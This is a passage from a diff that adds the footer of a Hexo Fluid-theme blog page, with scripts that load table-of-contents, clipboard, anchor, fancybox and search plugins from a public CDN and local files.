+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
